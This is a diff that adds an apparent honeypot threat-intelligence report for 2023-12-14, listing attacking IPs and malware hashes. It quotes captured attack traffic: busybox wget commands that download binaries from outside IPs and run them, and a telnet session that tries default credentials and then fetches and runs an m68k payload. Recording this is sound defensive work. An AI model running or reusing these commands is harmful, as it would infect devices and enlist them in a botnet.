@@ -1,0 +1,20 @@
+Top 5 IPs for 2023-12-14:
+149.12.246.2
+61.141.31.3
+159.89.178.230
+110.35.160.60
+110.35.160.241
+
+Malware seen: 
+Hash: a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
+https://www.virustotal.com/gui/file/a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
+Hash: 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+Hash: 76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+
+
+cd /data/local/tmp/; rm *; busybox wget http://176.97.210.229/crond.arm7; chmod 777 crond.arm7; ./crond.arm7
+cd /data/local/tmp/; rm *; busybox wget http://176.97.210.229/bash.arm7; chmod 777 bash.arm7; ./bash.arm7
+
+root\r\n1234\r\nenable\r\nsystem\r\nshell\r\nsh\r\n/bin/busybox DMSNA\r\n/bin/busybox mkdir /tmp/; >/tmp/.file && cd /tmp/\r\n/bin/busybox rm -rf .file .z .x\r\n/bin/busybox mkdir /var/; >/var/.file && cd /var/\r\n/bin/busybox rm -rf .file .z .x\r\n/bin/busybox mkdir /dev/; >/dev/.file && cd /dev/\r\n/bin/busybox rm -rf .file .z .x\r\n/bin/busybox mkdir /mnt/; >/mnt/.file && cd /mnt/\r\n/bin/busybox rm -rf .file .z .x\r\n/bin/busybox mkdir /var/run/; >/var/run/.file && cd /var/run/\r\n/bin/busybox rm -rf .file .z .x\r\n/bin/busybox mkdir /var/tmp/; >/var/tmp/.file && cd /var/tmp/\r\n/bin/busybox rm -rf .file .z .x\r\n/bin/busybox mkdir /; >/.file && cd /\r\n/bin/busybox rm -rf .file .z .x\r\n/bin/busybox mkdir /dev/netslink/; >/dev/netslink/.file && cd /dev/netslink/\r\n/bin/busybox rm -rf .file .z .x\r\n/bin/busybox mkdir /dev/shm/; >/dev/shm/.file && cd /dev/shm/\r\n/bin/busybox rm -rf .file .z .x\r\n/bin/busybox mkdir /bin/; >/bin/.file && cd /bin/\r\n/bin/busybox rm -rf .file .z .x\r\n/bin/busybox mkdir /etc/; >/etc/.file && cd /etc/\r\n/bin/busybox rm -rf .file .z .x\r\n/bin/busybox mkdir /boot/; >/boot/.file && cd /boot/\r\n/bin/busybox rm -rf .file .z .x\r\n/bin/busybox mkdir /usr/; >/usr/.file && cd /usr/\r\n/bin/busybox rm -rf .file .z .x\r\n/bin/busybox mkdir /sys/; >/sys/.file && cd /sys/\r\n/bin/busybox rm -rf .file .z .x\r\n/bin/busybox wget; /bin/busybox tftp; /bin/busybox HGYQA\r\n/bin/busybox cp /bin/busybox .z; >.z; /bin/busybox chmod 777 .z\r\n/bin/busybox wget http://37.49.224.231:80/batkek/m68k -O -> .z; /bin/busybox chmod 777 .z; ./.z telnet.m68k.wget; >.z\r\n
